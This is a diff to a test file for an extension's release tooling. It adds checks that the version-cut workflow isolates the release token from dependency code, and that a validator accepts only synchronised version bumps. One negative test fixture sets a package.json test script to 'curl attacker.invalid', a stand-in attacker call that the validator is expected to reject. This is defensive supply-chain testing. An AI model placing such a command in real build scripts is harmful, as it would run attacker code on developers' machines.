@@ -37,10 +37,25 @@ type ReleasePackageModule = {
   releaseArtifactNames(version: string): { archive: string; checksum: string };
 };
 
+type VersionCutModule = {
+  validateChangedEntries(entries: { path: string; status: string }[], pendingChangesets: string[]): string[];
+  validateVersionDocuments(input: {
+    basePackage: Record<string, unknown>;
+    nextPackage: Record<string, unknown>;
+    baseManifest: Record<string, unknown>;
+    nextManifest: Record<string, unknown>;
+    baseLock: Record<string, unknown>;
+    nextLock: Record<string, unknown>;
+    baseChangelog: string;
+    nextChangelog: string;
+  }): string[];
+};
+
 const policy = (await import(pathToFileURL(join(process.cwd(), 'scripts/check-version-policy.mjs')).href)) as VersionPolicyModule;
 const releasePackage = (await import(
   pathToFileURL(join(process.cwd(), 'scripts/package-extension-release.mjs')).href
 )) as ReleasePackageModule;
+const versionCut = (await import(pathToFileURL(join(process.cwd(), 'scripts/validate-version-cut.mjs')).href)) as VersionCutModule;
 
 function versionArtifacts(packageVersion = '0.1.0', manifestVersion = packageVersion) {
   return { packageVersion, manifestVersion, lockVersion: packageVersion, lockRootVersion: packageVersion };
@@ -206,6 +221,100 @@ test('version-cut workflow refreshes a checked Changesets PR and tags only fresh
   assert.doesNotMatch(workflow, /^\s+publish:/mu);
   assert.doesNotMatch(workflow, /^\s+prDraft:/mu);
   assert.doesNotMatch(workflow, /gh pr merge|auto-merge/u);
+});
+
+test('version-cut keeps dependency code off the clean token-bearing runner', () => {
+  const workflow = readFileSync('.github/workflows/version-cut.yml', 'utf8');
+  const prepareJob = workflow.slice(workflow.indexOf('\n  prepare-version-pr:'), workflow.indexOf('\n  publish-version-pr:'));
+  const publishJob = workflow.slice(workflow.indexOf('\n  publish-version-pr:'), workflow.indexOf('\n  tag:'));
+
+  assert.match(prepareJob, /npm ci/u);
+  assert.match(prepareJob, /npm run changeset:version/u);
+  assert.match(prepareJob, /actions\/upload-artifact@[0-9a-f]{40} # v7\.0\.1/u);
+  assert.doesNotMatch(prepareJob, /RELEASE_TOKEN|GH_TOKEN|contents: write|pull-requests: write/u);
+
+  assert.match(publishJob, /needs: prepare-version-pr/u);
+  assert.match(publishJob, /actions\/download-artifact@[0-9a-f]{40} # v8\.0\.1/u);
+  assert.match(publishJob, /node scripts\/validate-version-cut\.mjs/u);
+  assert.match(publishJob, /git -c core\.hooksPath=\/dev\/null -c commit\.gpgsign=false commit/u);
+  assert.match(publishJob, /git -c core\.hooksPath=\/dev\/null push/u);
+  assert.doesNotMatch(publishJob, /npm ci|npm run changeset:version/u);
+});
+
+test('version-cut validator accepts only synchronized version artifacts and consumed changesets', () => {
+  const entries = [
+    { status: 'M', path: 'CHANGELOG.md' },
+    { status: 'M', path: 'extension/manifest.json' },
+    { status: 'M', path: 'package-lock.json' },
+    { status: 'M', path: 'package.json' },
+    { status: 'D', path: '.changeset/steady-release.md' },
+  ];
+  assert.deepEqual(versionCut.validateChangedEntries(entries, ['.changeset/steady-release.md']), []);
+
+  const basePackage = { name: 'image-trail', version: '0.25.0', scripts: { test: 'npm run test:unit' } };
+  const nextPackage = { ...basePackage, version: '0.25.1' };
+  const baseManifest = { manifest_version: 3, name: 'Image Trail', version: '0.25.0' };
+  const nextManifest = { ...baseManifest, version: '0.25.1' };
+  const baseLock = {
+    name: 'image-trail',
+    version: '0.25.0',
+    lockfileVersion: 3,
+    packages: { '': { name: 'image-trail', version: '0.25.0' } },
+  };
+  const nextLock = structuredClone(baseLock);
+  nextLock.version = '0.25.1';
+  nextLock.packages[''].version = '0.25.1';
+  assert.deepEqual(
+    versionCut.validateVersionDocuments({
+      basePackage,
+      nextPackage,
+      baseManifest,
+      nextManifest,
+      baseLock,
+      nextLock,
+      baseChangelog: '# image-trail\n\n## 0.25.0\n\n- Previous.\n',
+      nextChangelog: '# image-trail\n\n## 0.25.1\n\n- Fixed.\n\n## 0.25.0\n\n- Previous.\n',
+    }),
+    [],
+  );
+});
+
+test('version-cut validator rejects executable drift and malformed patches', () => {
+  const errors = versionCut.validateChangedEntries(
+    [
+      { status: 'M', path: 'CHANGELOG.md' },
+      { status: 'M', path: 'extension/manifest.json' },
+      { status: 'M', path: 'package-lock.json' },
+      { status: 'M', path: 'package.json' },
+      { status: 'M', path: '.changeset/steady-release.md' },
+      { status: 'M', path: '.github/workflows/release.yml' },
+    ],
+    ['.changeset/steady-release.md'],
+  );
+  assert.match(errors.join(' '), /must be deleted/u);
+  assert.match(errors.join(' '), /forbidden path/u);
+
+  const basePackage = { name: 'image-trail', version: '0.25.0', scripts: { test: 'npm run test:unit' } };
+  const nextPackage = { ...basePackage, version: '0.25.1', scripts: { test: 'curl attacker.invalid' } };
+  const baseManifest = { manifest_version: 3, version: '0.25.0' };
+  const nextManifest = { ...baseManifest, version: '0.25.1' };
+  const baseLock = { version: '0.25.0', packages: { '': { version: '0.25.0' } } };
+  const nextLock = { version: '0.25.1', packages: { '': { version: '0.25.1' } } };
+  assert.match(
+    versionCut
+      .validateVersionDocuments({
+        basePackage,
+        nextPackage,
+        baseManifest,
+        nextManifest,
+        baseLock,
+        nextLock,
+        baseChangelog: '# image-trail\n\n## 0.25.0\n\n- Previous.\n',
+        nextChangelog: '# image-trail\n\n## 0.25.1\n\n- Fixed.\n\n## 0.25.0\n\n- Previous.\n',
+      })
+      .join(' '),
+    /package\.json changes fields other than version/u,
+  );
 });
 
 test('no workflow that carries RELEASE_TOKEN can reach a third-party action', () => {
